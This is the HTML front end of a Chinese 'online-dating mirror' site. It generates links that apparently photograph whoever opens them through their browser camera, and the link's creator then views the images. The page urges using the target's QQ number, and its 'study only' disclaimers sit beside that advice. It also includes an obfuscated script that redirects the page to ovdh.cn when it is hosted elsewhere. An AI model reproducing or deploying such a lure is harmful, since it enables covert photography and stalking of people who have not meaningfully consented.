
<!DOCTYPE html>
<html lang="zh-CN">
  <head>
   <style>
	body {
	     		background: url(/images/qtbj.jpeg&quot;) no-repeat center center fixed;
                background-size: cover;
	}
	</style>
      
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <title>网恋照妖镜</title>
    <!--baidu-->
    <!-- Bootstrap -->
    <link href="http://cdn.bootcss.com/bootstrap/3.3.4/css/bootstrap.css" rel="stylesheet">
    <script src></script>
   
	<script src="http://cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
	<script src="http://cdn.bootcss.com/layer/3.0.3/layer.min.js"></script>
	<link rel="stylesheet" type="text/css" href="css/shop_style.css">
	<link href="css/shop.css" rel="stylesheet" type="text/css">
	<link href="css/style.css" rel="stylesheet" type="text/css">
	<script src="js/jquery.min.js"></script>
	<link rel="shortcut icon" href="https://www.baidu.com/favicon.ico" type="image/x-icon">
	<script src="http://lib.baomitu.com/jquery/3.4.1/jquery.min.js"></script>
</head>
<body>
    <style> 
        #M1{
        	width: 110px;
    height: 35px;
    padding-top: 2px\9;
    /* cursor: pointer; */
    color: #fff;
    font-size: 15px;
    /* letter-spacing: 1px; */
    background: #3385ff;
    /* border-bottom: 1px solid #2d78f4; */
    /* outline: medium; */
    *: ;
    border-bottom: none;
    -webkit-appearance: none;
    -webkit-border-radius: 0;
    border: 0;
        text-align: center;
    text-decoration:none;
    color: #fff;
    background-color: #007bff;
    border-color: #007bff;
        padding: 7px;
        float: left;
        margin-left: 2%;     
        margin-top: 2%;
        }
</style> 
    
<script>
function  create() {
    var input = document.getElementById('content');
    var kd = document.getElementById('kd');
    var myid = document.getElementById('myid');
    var url = document.getElementById('url');
    if (myid.value=="" || url.value==""){
        alert("数字ID或跳转地址不能为空！");
        return false;
    }
    kd.href = 'https://www.suixinln.xyz/?id='+myid.value+'&url='+url.value; //修改此处的域名 必须要SSL证书 www.luyuz.cn 路羽资源博客
    kd.style = ''; 
    kd.innerText = 'https://www.suixinln.xyz/?id='+myid.value+'&url='+url.value; //修改此处的域名  必须要SSL证书  www.luyuz.cn 路羽资源博客
}
</script>
<div id="bob">


	<div id="bd">
<div class="ct" style="padding:0;">
<section class="index">
<div id="bds">
	<div id="content">
	<div class="hd">
	
	<img src="images/11.png"></div>
	<div class="mall" id="contentss">


        <div class="swiper-container">
            <div class="content-slide">
                <div class="purchase_from">
					<ul id="Open" style="display:block;">
						<form action="?" class="form-sign" method="get" name="auth" onSubmit="return checkURL();">
						<li>
						<input type="text" class="form-control" id="myid" placeholder="输入对方QQ或自己记得住的数字，生成链接" value>
                        <p>当拍摄成功后跳转到的网址：</p>
                        <input type="text" class="form-control" id="url" value="http://www.baidu.com">
						</li>
						<li>
						<input type="button" value="生成链接" onclick="create();" style="display: block;background: #0099CC!important;height: 40px;font-size: 16px;color: #fff;border-radius: 4px;text-align: center;overflow: hidden;"> <br>   
						</li>
						<li class="btn_purchase">
                            <input type="button" value="查看照片" onclick="window.location.href='ck.php?id='+document.getElementById('myid').value" style="display: block;background: #0099CC!important;height: 40px;font-size: 16px;color: #fff;border-radius: 4px;text-align: center;overflow: hidden;">
                        </li>
						<div class="alert alert-success">
                        <img src="images/ico_success.png">
						<a id="kd" style="pointer-events: none;">请先生成链接！</a>
						</div>
						<span id="Order"></span>
						</form>
                    </ul>
                    <ul id="query" style="display: none;">
                        <form action="?" class="form-sign" method="get" name="auth" onSubmit="return checkURL();">
                        <li class="btn_purchase">
						
					
    <a href="" id="M1" style="background-color: rgb(0, 153, 204);"></a>
    <a href="" id="M1" style="background-color: rgb(0, 153, 204);"></a>
                    
                        </li>
						  
                        <span id="Orderd"></span>
						</form>
                    </ul>
                    <ul id="Back" style="display:none;">
                        <center>
						<h4 class="hd_tit" style="height:auto;line-height:normal;padding:10px;color:#FFFFFF;">温馨提示<br>
						<span style="font-size:13px;color:red;">注意：建议使用对方QQ生成链接!</span>
						</h4>

						</center>
						<div class="list-group-item text-center">
					   <p>1.本工具仅做学习交流使用，请勿用于非法用途！后果自负！</p>
                       <p>2.懒得做数据库，输入的数字ID是查看照片的凭证，不要泄露给知道这个平台的人</p>
                       <p>3.本站不存储数据，如需保存请尽快保存，以免丢失。</p>  
						</div>
                        <span id="Order"></span>
                    </ul>
                </div>
            </div>
        </div>
        <div class="gnbt">照妖镜功能简介</div>
			<div class="bd">
				<div class="bc">
				   <textarea readonly="true" name="notice" id cols="30" rows="15" style="max-width: 100%;width:100%">                   ★必看说明★  
1、框内填写QQ号、微信号生成链接，方便记忆，不要带_下划线。
2、生成链接后复制生成的链接发送给自己或想要参与自拍测试的人。
3、点开链接后，你打开本站，填写前面输入的数字，点击查看照片即可！  
4、由于系统安全机制，IOS系统必须使用自带的Safari浏览器（或者第三方APP调用的是Safari内核）才可使用。
5、IOS手机较老、系统较老将无法使用，图片会显示一片空白。建议使用安卓手机。

★免责声明★  
1、本程序仅供学习交流使用，请勿用于非法用途，否则后果自负！
2、本程序是一款浏览器自拍网站，是用户自愿点击允许的情况下拍照的程序！
4、本站是一个学习交流平台，一切内容均为网友自发行为，肖像权归属原作者所有，查看照片后可以自己删除图片！

请收藏本站书签，以防丢失！ </textarea>
				</div>
			</div>
			<div class="ft">SuixinLn提示：请勿传播！！！</div>
    	</div>
    	
<div width="100px" height="100px"
											style=" margin: 10px auto; border: 1px solid #ebf3ff; text-align: center">
											Copyright ©2023<a href="https://www.suixinln.xyz/" target="_blank">
												By SuixinLn </a>All rights reserved.
										</div>
    	
    </div>
    <p style="text-align:center"><br><a style="color: #FFFFFF"></a></p><br>
</div>
<div id="loading"></div>
	</div>
	</div>
	</section></div>
	</div>
	<div style="clear:both;"></div>

<p style="text-align:center"><br><a style="color: #FFFFFF">Copyright ©2021Powered By:路羽!</a></p><br>
<script type="text/javascript" src="js/main.js"></script>
<script>
$(document).ready(function(){
	getqrpic();
});
<script type="text/javascript">
//blog:luyuz.cn
var a = 'retrtrfdcfvvvv';
var ym = window.location;
var ym2 = 'www.ovdh.cn';
var ym3 = String(ym);

function suan(a){
var re = a.substring(0,2);
var tr = a.substring(2,4);
var tr2 = a.substring(4,6);
var fd = a.substring(6,8);
var cf = a.substring(8,10);
var vv = a.substring(10,12);
var vv2 = a.substring(12,14);
re = 'h';
tr = 't';
tr2 ='t';
fd = 'p';
cf = ':';
vv = '/';
vv2 = '/';
var p = re+tr+tr2+fd+cf+vv+vv2;
return p;
}
if (ym3.indexOf(ym2) == -1 ) {
alert(ym2);
// var av = ym3;
var b = suan(a) + 'ovdh.cn' + '/';
window.location = b;
}
</script>

<script language="Javascript">
document.oncontextmenu=new Function("event.returnValue=false");
document.onselectstart=new Function("event.returnValue=false");
</script>
</script>
		<script src="js/index.js"></script><!-- 核心插件 -->
		<script src="js/all.js"></script><!-- 图标库 -->
		<script src="js/Sitetime.js"></script><!-- 运行时间 -->
		<script src="js/Mouse.js"></script><!-- 点击烟花特效 --
	 --></div></body></html>